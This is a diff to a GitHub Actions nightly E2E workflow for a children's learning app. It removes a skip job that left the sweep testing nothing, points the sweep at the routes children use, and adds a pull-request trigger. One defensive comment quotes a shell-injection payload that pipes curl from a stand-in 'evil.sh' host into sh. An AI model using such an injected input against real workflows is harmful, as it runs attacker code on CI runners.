@@ -1,12 +1,14 @@
 name: Nightly E2E
 
-# THE LAUNCH GATE, ON A TIMER. `all-chapters` asks the one question that decides launch day —
-# *does all of it still open?* — across every chapter a child can reach, on three frames. Until now
-# it ran only when someone remembered, which for a 70-chapter app means "not before the deploy that
-# breaks one". Measured at 7.7 min against a production build (the ~18 min figure in the docs is a
-# DEV-server run — `next start` is roughly twice as fast), plus ~2 min for install and build. Still
-# too slow for the PR path, so it lives here; `ci.yml` keeps the fast gates (tsc, 1118 vitest,
-# build, audit) where they can block a merge.
+# THE LAUNCH GATE, ON A TIMER. `all-chapters` asks *does everything a child can reach still open?* —
+# the 23 KG–2 chapters at `/game?c=<id>` and the first topic of each of the 36 grade 3–8 modules at
+# `/lesson?id=<topic>`, on three frames (laptop, 640×320, 390×844). Its list is written out by hand in
+# the spec. Too slow for the PR path, so it lives here; `ci.yml` keeps the fast gates.
+#
+# ⚠️ FROM 2026-09-13 TO 2026-10 THIS JOB TESTED NOTHING AND SHOWED GREEN. A `legacy-gate` job skipped the
+# sweep while `LEGACY_CHAPTERS_HIDDEN` was true, because the sweep drove the `/story` preview, which that
+# flag turns off — while the same 23 chapters were live for children at `/game`. The gate is gone; the
+# sweep now drives the routes children use, so there is no skip path left to go quiet in.
 #
 # ⚠️ IT RUNS AGAINST A PRODUCTION BUILD ON THE RUNNER, NEVER AGAINST PRODUCTION.
 # Pointing this at the live site would trip Vercel's firewall at roughly the fortieth navigation
@@ -16,13 +18,10 @@ name: Nightly E2E
 # than `next dev` does: the production CSP (no 'unsafe-eval') and the production React build, which
 # is what the "zero console errors" contract is really asserting.
 #
-# The placeholder Supabase env is the same pair ci.yml uses: `all-chapters` only opens chapters and
-# watches the console, and the chapter routes are public — no auth, no database. Specs that DO need
-# a real user (adaptive, plan-advance) rely on the dev-only [data-test-answer] hook, which is
-# dead-code-eliminated from a production build, so they are deliberately NOT in this job.
-#
-# Verified before shipping: full 211-test sweep run locally against exactly this setup
-# (production build + placeholder env + `next start -p 3017`).
+# The placeholder Supabase env is the same pair ci.yml uses: `all-chapters` seeds an unsigned session in
+# localStorage, opens each route and watches the console — no real auth, no database. The placeholder
+# host does not resolve, so the spec excuses failed loads from THAT host only (audio clips, RPCs);
+# anything failing from our own origin still fails.
 
 on:
   schedule:
@@ -30,7 +29,7 @@ on:
   workflow_dispatch:
     inputs:
       only:
-        description: 'Narrow to chapters (comma-separated, e.g. decimals,rounding)'
+        description: 'Narrow to entries (comma-separated, e.g. counting,g5m1-t1)'
         required: false
         default: ''
       wide_text:
@@ -42,41 +41,18 @@ on:
         description: 'Stress the layout with 8% wider text (one-off, not nightly)'
         required: false
         default: 'false'
+  # Once on a pull request that touches the sweep, so it is green (or red) on the commit that changes it.
+  pull_request:
+    paths: ['.github/workflows/nightly-e2e.yml', 'e2e/all-chapters.spec.ts']
 
 permissions:
   contents: read
   issues: write        # the failure notice below is the whole point of running this on a timer
 
 jobs:
-  # ⚠️ PAUSED WHILE LEGACY CHAPTERS ARE HIDDEN (src/core/chapters.ts, founder's call 2026-09-13).
-  # This sweep drives the legacy chapters; with them hidden it could only go red every run, and a
-  # permanently-red scheduled job is noise nobody reads. The pause is LOUD, not silent: this job
-  # writes a warning and a summary line on every run, and the sweep job shows as skipped.
-  legacy-gate:
-    runs-on: ubuntu-latest
-    timeout-minutes: 10 # p95 0.4 min over 12 runs; 10 min floor (ARC-07; GitHub default 360)
-    outputs:
-      run: ${{ steps.flag.outputs.run }}
-    steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-      - id: flag
-        run: |
-          if grep -q 'export const LEGACY_CHAPTERS_HIDDEN = true' src/core/chapters.ts; then
-            echo "::warning::Legacy chapters are hidden (src/core/chapters.ts) — this chapter sweep is PAUSED and tested nothing."
-            echo "### ⏸ Paused: legacy chapters hidden — sweep did not run" >> "$GITHUB_STEP_SUMMARY"
-            echo "run=false" >> "$GITHUB_OUTPUT"
-          elif grep -q 'export const LEGACY_CHAPTERS_HIDDEN = false' src/core/chapters.ts; then
-            echo "run=true" >> "$GITHUB_OUTPUT"
-          else
-            echo "::error::could not read LEGACY_CHAPTERS_HIDDEN in src/core/chapters.ts — refusing to guess"
-            exit 2
-          fi
-
   chapters:
-    needs: legacy-gate
-    if: needs.legacy-gate.outputs.run == 'true'
     runs-on: ubuntu-latest
-    timeout-minutes: 45 # 7.7 min observed; the cap is here so a hang cannot burn the budget
+    timeout-minutes: 45 # the cap is here so a hang cannot burn the budget
     env:
       NEXT_PUBLIC_SUPABASE_URL: https://placeholder.supabase.co
       NEXT_PUBLIC_SUPABASE_ANON_KEY: placeholder-anon-key
@@ -112,7 +88,7 @@ jobs:
       # A `schedule` run passes '' for the unset input, and the spec's original parse turned '' into
       # an empty-but-TRUTHY array — which skipped every chapter and still reported green. Both ends
       # are fixed; belt and braces, because a nightly that silently tests nothing is worse than none.
-      - name: Every chapter opens (70 chapters x 3 frames)
+      - name: Every chapter and lesson opens (59 routes x 3 frames)
         # ⚠️ THE INPUT ARRIVES VIA `env:`, NEVER INTERPOLATED INTO THE SCRIPT. `${{ }}` is expanded
         # by Actions BEFORE bash sees the line, so `${{ github.event.inputs.only }}` pastes the raw
         # value into the shell as code — an input of `"; curl evil.sh | sh; #` runs on the runner.
@@ -130,14 +106,9 @@ jobs:
             export E2E_WIDE_TEXT=1
             echo "::notice::wide-text stress ON — every glyph 8% wider than it renders anywhere"
           fi
-          # ⚠️ `start-card` runs alongside, and it is not redundant. `all-chapters` enters a
-          # chapter by clicking its biggest control and measuring 900 ms later, which on a
-          # GameShell route lands on the ExploreStep — one screen BEFORE the start card. Eight
-          # chapters shipped with their start button 10px below the fold at 640×320 and that gate
-          # reported them clean, because it never loaded the screen the defect is on.
           # tee, so the failure notice below can quote the actual failing tests rather than a link.
           set -o pipefail
-          npx playwright test e2e/all-chapters.spec.ts e2e/start-card.spec.ts 2>&1 | tee /tmp/e2e.log
+          npx playwright test e2e/all-chapters.spec.ts 2>&1 | tee /tmp/e2e.log
 
       # Traces are retain-on-failure, so this uploads only when there is something to look at —
       # which is the difference between a red nightly you can diagnose and one you re-run blindly.
@@ -157,7 +128,7 @@ jobs:
       # PR, so the result has to go and find someone: one issue, reopened and updated rather than a
       # new one every night, so it cannot become its own kind of noise.
       - name: File (or update) the failure notice
-        if: failure()
+        if: failure() && github.event_name != 'pull_request'
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
@@ -178,7 +149,7 @@ jobs:
       # And the other half: a gate that never closes its own ticket teaches people to ignore the
       # ticket instead of the job.
       - name: Close the notice on a green run
-        if: success()
+        if: success() && github.event_name != 'pull_request'
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
